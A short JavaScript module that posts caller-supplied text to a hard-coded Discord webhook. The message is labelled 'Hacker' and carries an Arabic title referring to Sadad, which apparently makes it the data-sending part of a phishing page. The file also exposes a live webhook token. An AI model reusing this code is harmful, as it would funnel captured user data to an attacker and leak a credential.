import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1364700200308048043/oCj-MDU5vF1QOG8dbvZkhExU3vB4WIPFj6FxctlUE8v7vxTrENVywcBWSLdBFp42hugk",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
